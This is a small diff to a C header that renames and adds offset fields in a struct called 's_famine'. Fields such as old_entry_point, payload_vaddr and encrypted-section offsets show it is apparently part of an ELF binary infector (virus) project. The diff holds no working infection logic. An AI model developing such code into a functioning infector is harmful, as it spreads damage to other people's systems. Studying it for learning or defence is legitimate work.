@@ -156,10 +156,12 @@ typedef struct s_famine
     t_elf_addr old_entry_point;
     t_elf_addr payload_vaddr;
 
-    t_elf_off text_p_start_offset;
-    t_elf_off text_p_end_offset;
-    size_t text_p_size;
-    t_elf_addr text_p_vaddr;
+    t_elf_off p_text_start_offset;
+    t_elf_off p_text_end_offset;
+    size_t p_text_size;
+    t_elf_addr p_text_vaddr;
+
+    t_elf_off p_data_end_offset;
 
     t_elf_off encrypt_s_start_offset;
     t_elf_off encrypt_s_end_offset;
